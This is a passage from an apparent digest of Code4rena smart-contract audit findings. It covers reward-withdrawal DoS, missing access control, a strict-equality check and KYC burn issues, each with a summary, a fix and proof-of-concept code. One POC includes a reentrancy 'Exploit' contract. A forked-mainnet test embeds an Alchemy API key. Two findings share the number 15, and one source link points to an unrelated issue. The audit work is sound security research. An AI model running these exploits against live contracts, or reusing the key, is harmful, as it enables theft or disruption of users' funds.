      // Alice tried to get the rewards she had earned but could not get them, even with the rewards being in this contract, because the next reward cycle
      // starts at block ((210000 * 2) + 1).
      vm.expectRevert();
      vm.prank(alice);
      liquidERC20.distributeToAllHolders();
      }
  }

  ```

  </details>

## 12.[Medium] Withdrawal from NFTs can be temporarily blocked

### i can not become greater than length

- Summary: If nextWithdrawal exceeds the number of managed NFTs, the contract cannot withdraw revenue. This could happen if NFTs are released after withdrawFromManagedNFTs calls or if malicious users exploit ERC20 operation changes to manipulate the process.

- Impact & Recommendation: Consider modifying a check to makesure nextWithdrawal can not become greater than ManagedNFTs length.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-04-withdrawal-from-nfts-can-be-temporarily-blocked) & [Report](https://code4rena.com/reports/2024-02-thruster)

  <details><summary>POC</summary>

  ```solidity
  import {LiquidInfrastructureERC20, ERC20} from "../contracts/LiquidInfrastructureERC20.sol";
  import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
  import {Test} from "forge-std/Test.sol";
  import "forge-std/console.sol";
  contract Exploit {
      LiquidInfrastructureERC20 target;
      constructor(LiquidInfrastructureERC20 _target) {
          target = _target;
      }
      function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
          // set counter
          target.withdrawFromManagedNFTs(2);
          return this.onERC721Received.selector;
      }
  }
  contract MockToken is ERC20 {
      constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
      function mint(address to, uint256 amount) external {
          _mint(to, amount);
      }
  }
  contract C4 is Test {
      LiquidInfrastructureERC20 liqERC20;
      MockToken usdc;
      address alice;
      address bob;
      function setUp() public {
          alice = address(0xa11cE);
          bob = address(0xb0b);
          usdc = new MockToken("USDC", "USDC");
          address[] memory rewards = new address[](1);
          rewards[0] = address(usdc);
          address[] memory approved = new address[](3);
          approved[0] = address(this);
          approved[1] = alice;
          approved[2] = bob;
          address[] memory nfts = new address[](3);
          nfts[0] = address(new LiquidInfrastructureNFT("NAME"));
          nfts[1] = address(new LiquidInfrastructureNFT("NAME"));
          nfts[2] = address(new LiquidInfrastructureNFT("NAME"));
          liqERC20 = new LiquidInfrastructureERC20("LIQ", "LIQ", nfts, approved, 10, rewards);
          for(uint256 i=0; i<nfts.length; i++) {
              usdc.mint(nfts[i], 1_000_000 * 1e18);
              LiquidInfrastructureNFT(nfts[i]).setThresholds(rewards, new uint256[](1));
              LiquidInfrastructureNFT(nfts[i]).transferFrom(address(this), address(liqERC20), 1);
          }
      }
      function testWithdrawDOS() public {
          Exploit exploit = new Exploit(liqERC20);
          address nft = liqERC20.ManagedNFTs(0);
          address toRelease1 = liqERC20.ManagedNFTs(1);
          address toRelease2 = liqERC20.ManagedNFTs(2);
          liqERC20.withdrawFromAllManagedNFTs();
          assertEq(usdc.balanceOf(address(liqERC20)), 3_000_000 * 1e18);
          uint256 balBefore = usdc.balanceOf(address(liqERC20));
          liqERC20.releaseManagedNFT(toRelease2, address(exploit));
          liqERC20.releaseManagedNFT(toRelease1, alice);
          // new rewards are ready
          usdc.mint(nft, 1_000_000 * 1e18);
          liqERC20.withdrawFromAllManagedNFTs();
          uint256 balAfter = usdc.balanceOf(address(liqERC20));
          // 1 mil wasn't withdrawn
          assertEq(balBefore, balAfter);
      }
  }

  ```

  </details>

## 13.[Medium] Limited availability of balance_of(...) method

### Not consistent with document or notice

- Summary: The balance_of() method is supposed to be available to any contract but is currently restricted to the system contract due to the ensure_system check, causing issues for user contracts.

- Impact & Recommendation: Remove the ensure_system check from the balance_of(…) method to ensure availability for any contract.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-phala-network#m-01-limited-availability-of-balance_of-method) & [Report](https://code4rena.com/reports/2024-03-phala-network)

  <details><summary>POC</summary>

  ```rust
    #[test]
    fn test_balance_of() {
        const TEST_ADDRESS: AccountId32 = AccountId32::new([255u8; 32]);
        let (mut cluster, checker) = create_cluster();
        let balance = 114514;
        cluster.tx().deposit(TEST_ADDRESS.clone(), balance);
        let result = checker
            .call()
            .direct_balance_of(TEST_ADDRESS.convert_to())
            .query(&mut cluster);
        assert_eq!(result.unwrap(), (balance, balance));
    }

  ```

  </details>

## 14.[High] Anyone can update the address of the Router in the DcntEth contract to any address they would like to set.

### Access control

- Summary: Allowing users to set the Router address in the DcntEth contract could let malicious users access mint and burn functions meant only for the router contract. This could lead to unauthorized minting of DcntEth tokens, disrupting crosschain accounting or stealing deposited WETH in the DecentEthRouter contract, burning all DcntEth tokens issued to it, affecting liquidity providers, or causing a DOS attack on the add and remove liquidity functions of DecentEthRouter if the router address differs.

- Impact & Recommendation: Make sure to add an Access Control mechanism to `setRouter` function.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-decent#h-01-anyone-can-update-the-address-of-the-router-in-the-dcnteth-contract-to-any-address-they-would-like-to-set) & [Report](https://code4rena.com/reports/2024-01-decent)

  <details><summary>POC</summary>

  ```solidity
    //@audit-issue => No access control to restrict who can set the address of the router contract
    function setRouter(address _router) public {
        router = _router;
    }

    //@audit-info => Only the router can call the mint()
    function mint(address _to, uint256 _amount) public onlyRouter {
        _mint(_to, _amount);
    }
    //@audit-info => Only the router can call the burn()
    function burn(address _from, uint256 _amount) public onlyRouter {
        _burn(_from, _amount);
    }


  ```

  </details>

## 15.[High] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP

### `>=` instead of `==`

- Summary: Arbitrarily sending collateral tokens to PerpetualAtlanticVaultLP disrupts the synchronization between total collateral and the contract's actual balance. This causes the subtractLoss function to fail, as it requires exact matching between these values. This issue cannot be resolved by the admin, as there is no function to synchronize the values without moving tokens.

- Impact & Recommendation: Use `>=` instead of `==` at `PerpetualAtlanticVaultLP.subtractLoss` .
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-03-the-settle-feature-will-be-broken-if-attacker-arbitrarily-transfer-collateral-tokens-to-the-perpetualatlanticvaultlp) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    function subtractLoss(uint256 loss) public onlyPerpVault {
    require(
    -   collateral.balanceOf(address(this)) == _totalCollateral - loss,
    +   collateral.balanceOf(address(this)) >= _totalCollateral - loss,
        "Not enough collateral was sent out"
    );
    _totalCollateral -= loss;
    }

  ```

  </details>

## 15.[High] Development Team might receive less SALT because there is no access control on VestingWallet#release()

### Absence of access control on the `release()` function

- Summary: the Development Team could have the potential loss of SALT distribution rewards for due to the absence of access control on the `release()` function in `estingWallet`. This oversight allows anyone to call `release()` and distribute SALT without informing the `Upkeep` contract, resulting in the locked distribution of SALT in `Upkeep` indefinitely.

- Impact & Recommendation: Configured `managedTeamWallet` as beneficiary for `teamVestingWallet` deployment. Added function in `managedTeamWallet` to transfer SALT balance to mainWallet.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#h-01-development-team-might-receive-less-salt-because-there-is-no-access-control-on-vestingwalletrelease) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity
  function testTeamRewardIsLockedInUpkeep() public {
    uint releasableAmount = teamVestingWallet.releasable(address(salt));
    uint upKeepBalance = salt.balanceOf(address(upkeep));
    uint mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info a certain amount of SALT is releasable
    assertTrue(releasableAmount != 0);
    //@audit-info there is no SALT in upkeep
    assertEq(upKeepBalance, 0);
    //@audit-info there is no SALT in mainWallet
    assertEq(mainWalletBalance, 0);
    //@audit-info call release() before performUpkeep()
    teamVestingWallet.release(address(salt));
    upkeep.performUpkeep();

    upKeepBalance = salt.balanceOf(address(upkeep));
    mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info all released SALT is locked in upKeep
    assertEq(upKeepBalance, releasableAmount);
    //@audit-info development team receive nothing
    assertEq(mainWalletBalance, 0);
  }

  ```

  </details>

## 16.[High] crvRewardsContract getReward can be called directly, breaking vaults claimRewards functionallity

### Absence of access control on the `getReward()` function

- Summary: The `crvRewardsContract` of Convex can be accessed by anyone, enabling malicious users to call the `getReward` function and disrupt the Vault's `claimRewards` functionality. As a result, malicious users can prevent Vaults from receiving their deserved rewards, thereby undermining the integrity of the system.

- Impact & Recommendation: Create another functionality inside Vault that similar to claimRewards, but used CVX, CRV balance inside the contract, to perform the AMPH claim and claim the rewards.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-07-amphora#h-02-crvrewardscontract-getreward-can-be-called-directly-breaking-vaults-claimrewards-functionallity) & [Report](https://code4rena.com/reports/2023-07-amphora)

  <details><summary>POC</summary>

  ```solidity
    function claimRewards(address[] memory _tokenAddresses) external override onlyMinter {
    uint256 _totalCrvReward;
    uint256 _totalCvxReward;
    IAMPHClaimer _amphClaimer = CONTROLLER.claimerContract();
    for (uint256 _i; _i < _tokenAddresses.length;) {
      IVaultController.CollateralInfo memory _collateralInfo = CONTROLLER.tokenCollateralInfo(_tokenAddresses[_i]);
      if (_collateralInfo.tokenId == 0) revert Vault_TokenNotRegistered();
      if (_collateralInfo.collateralType != IVaultController.CollateralType.CurveLPStakedOnConvex) {
        revert Vault_TokenNotCurveLP();
      }
      IBaseRewardPool _rewardsContract = _collateralInfo.crvRewardsContract;
      uint256 _crvReward = _rewardsContract.earned(address(this));
      if (_crvReward != 0) {
        // Claim the CRV reward
        _totalCrvReward += _crvReward;
        _rewardsContract.getReward(address(this), false);
        _totalCvxReward += _calculateCVXReward(_crvReward);
      }
   ...
  }

  ```

  </details>

## 17.[Medium] Integration issue in ousgInstantManager with BUIDL if minUSTokens is set by blackrock

### Minimum token requirements

- Summary: Integration issues may arise with BUIDL if Blackrock sets a minimum requirement for BUIDL tokens to be held by holders. Currently, the OUSGInstantManager contract does not ensure it always maintains the required minimum amount of BUIDL tokens during redemptions, potentially leading to unexpected reverts and violating Ondo's main functionalities.

- Impact & Recommendation: Implement an interface for the minUSTokens function and adjusting the redemption logic to ensure compliance with the minimum token requirements, thus preventing unexpected reverts and ensuring compatibility with potential future changes.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-ondo-finance#m-01-integration-issue-in-ousginstantmanager-with-buidl-if-minustokens-is-set-by-blackrock) & [Report](https://code4rena.com/reports/2024-03-ondo-finance)

  <details><summary>POC</summary>

  ```solidity
    //SPDX-License-Identifier: MIT
    pragma solidity ^0.8.24;
    import {Test, console} from "forge-std/Test.sol";
    import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    interface IBUILDPause {
        function pause() external;
        function isPaused() external returns(bool);

    }
    interface IBUiLDRedeemer {
        function redeem(uint256 amount) external;
    }
    // 0x1e695A689CF29c8fE0AF6848A957e3f84B61Fe69
    contract testBUILD is Test {
        // holders of BUILD tokens; just for test
        address holder1 = 0x72Be8C14B7564f7a61ba2f6B7E50D18DC1D4B63D;
        address holder2 = 0xEd71aa0dA4fdBA512FfA398fcFf9db8C49A5Cf72;
        address holder3 = 0xdc77C1D2A1dC61A31BE81e4840368DffEFAC3add;
        address holder4 = 0x1e695A689CF29c8fE0AF6848A957e3f84B61Fe69;
        address holder5 = 0xBc2cb4bF5510A1cc06863C96196a2361C8462525;
        address holder6 = 0xc02Ac677e58e40b66f100be3a721bA944807C2D7;
        address holder7 = 0x12c0de58D3b720024324d5B216DDFE8B29adB0b4;
        address holder8 = 0xb3c62fbe3E797502A978f418582ee92a5F327C23;
        address holder9 = 0x568430C66F9A256f609Ac07190d70c2c2573E065;

        // we get the owner form etherscan
        address ownerOfBUILD = 0xe01605f6b6dC593b7d2917F4a0940db2A625b09e;

        address build = 0x7712c34205737192402172409a8F7ccef8aA2AEc; // build token address
        IERC20 BUILD;
        uint256 MAINNET_FORK;
        function setUp() external {
            MAINNET_FORK = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/IrK2bvsF-q028QswCasD1dQqxV8nqGMs");
            vm.selectFork(MAINNET_FORK);
            BUILD = IERC20(build);
        }
        function testBUILDHolderTransfer() public {
            address sender = holder1;
            address to = holder9;
            uint amountToSend = 90000000e6;
            uint totalBalance = BUILD.balanceOf(sender);

            vm.startPrank(sender); // random 5 million holder
            BUILD.transfer(to, amountToSend); // transfer 1 million to alice
            console.log(totalBalance);
            console.log(BUILD.balanceOf(sender));
            console.log(BUILD.balanceOf(to));
        }
        function testMinTokensUS() external { //0x1dc378568cefD4596C5F9f9A14256D8250b56369
            COMPLIANCE compliance = COMPLIANCE(0x1dc378568cefD4596C5F9f9A14256D8250b56369); // compliance configuration service
            console.log(compliance.getMinUSTokens());
            console.log(compliance.getUSLockPeriod());
            vm.startPrank(0xe01605f6b6dC593b7d2917F4a0940db2A625b09e); // owner address form etherscan
            compliance.setMinUSTokens(10000000e6);
            console.log(compliance.getMinUSTokens());
            vm.stopPrank();
            address sender = holder1;
            address to = holder9;
            uint amountToSend = 90000000e6;


            vm.startPrank(sender);
            BUILD.transfer(to, amountToSend);
            uint totalBalance = BUILD.balanceOf(sender);
            console.log(totalBalance);
            console.log(BUILD.balanceOf(sender));
            console.log(BUILD.balanceOf(to));
        }


  ```

  </details>

## 18.[Medium] The BURNER cannot burn tokens from accounts not KYC verified due to the check in `_beforeTokenTransfer`.

### Burn tokens & KYC

- Summary: When attempting to burn tokens, the contract checks the KYC status of the sender and recipient accounts using `_beforeTokenTransfer`, leading to reverts if either account is not KYC verified. This prevents the BURNER_ROLE from burning tokens of accounts removed from the KYC list.

- Impact & Recommendation: Allow the `BURNER` to burn tokens without checking the KYC of `from` address.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-ondo-finance#m-04-the-burner-cannot-burn-tokens-from-accounts-not-kyc-verified-due-to-the-check-in-_beforetokentransfer) & [Report](https://code4rena.com/reports/2024-03-ondo-finance)

  <details><summary>POC</summary>

  ```solidity
    diff --git a/forge-tests/ousg/rOUSG.t.sol b/forge-tests/ousg/rOUSG.t.sol
    index 67faa15..b39b4ac 100644
    --- a/forge-tests/ousg/rOUSG.t.sol
    +++ b/forge-tests/ousg/rOUSG.t.sol
    @@ -13,6 +13,7 @@ contract Test_rOUSG_ETH is OUSG_BasicDeployment {
        CashKYCSenderReceiver ousgProxied = CashKYCSenderReceiver(address(ousg));
        vm.startPrank(OUSG_GUARDIAN);
        ousgProxied.grantRole(ousgProxied.MINTER_ROLE(), OUSG_GUARDIAN);
    +    ousgProxied.grantRole(ousgProxied.BURNER_ROLE(), OUSG_GUARDIAN);
        vm.stopPrank();
        // Sanity Asserts
    @@ -26,6 +27,15 @@ contract Test_rOUSG_ETH is OUSG_BasicDeployment {
        assertTrue(registry.getKYCStatus(OUSG_KYC_REQUIREMENT_GROUP, alice));
    }
    +  function test_burn_with_NOKYC() public dealAliceROUSG(1e18) {
    +      vm.startPrank(OUSG_GUARDIAN);
    +      _removeAddressFromKYC(OUSG_KYC_REQUIREMENT_GROUP, alice);
    +      vm.stopPrank();
    +
    +      vm.startPrank(OUSG_GUARDIAN);
    +      rOUSGToken.burn(alice, 1e18);
    +      vm.stopPrank();
    +  }
    /*//////////////////////////////////////////////////////////////
                            rOUSG Metadata Tests
    //////////////////////////////////////////////////////////////*/

  ```

  </details>

## 19.[Medium] Invocation delays are not honoured when protocol unpauses

### delays & pauses

- Summary: Pause durations are not consistently considered in protocol processes like `processMessage()`, allowing non-preferred executors to front-run preferred ones after unpausing. Similar issues exist in other functions and contracts, risking fairness and security. Update the protocol to consistently account for pause durations, adjusting invocation delays and implementing pause duration checks to prevent exploitation and ensure fairness and security.

- Impact & Recommendation: Introduce a new variable to track time spent in the valid wait window before a pause, and track the timestamp of the last unpause.

  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#m-13-taiko-sgx-attestation---improper-validation-in-certchain-decoding) & [Report](https://code4rena.com/reports/2024-03-taiko)

  <details><summary>POC</summary>

  ```solidity
        File: contracts/bridge/Bridge.sol
    233: @--->            (uint256 invocationDelay, uint256 invocationExtraDelay) = getInvocationDelays();
    234:
    235:                  if (!isMessageProven) {
    236:                      if (!_proveSignalReceived(signalService, msgHash, _message.srcChainId, _proof)) {
    237:                          revert B_NOT_RECEIVED();
    238:                      }
    239:
    240:                      receivedAt = uint64(block.timestamp);
    241:
    242:                      if (invocationDelay != 0) {
    243:                          proofReceipt[msgHash] = ProofReceipt({
    244:                              receivedAt: receivedAt,
    245:                              preferredExecutor: _message.gasLimit == 0 ? _message.destOwner : msg.sender
    246:                          });
    247:                      }
    248:                  }
    249:
    250:                  if (invocationDelay != 0 && msg.sender != proofReceipt[msgHash].preferredExecutor) {
    251:                      // If msg.sender is not the one that proved the message, then there
    252:                      // is an extra delay.
    253:                      unchecked {
    254:                          invocationDelay += invocationExtraDelay;
    255:                      }
    256:                  }
    257:
    258: @--->            if (block.timestamp >= invocationDelay + receivedAt) {

  ```

  </details>
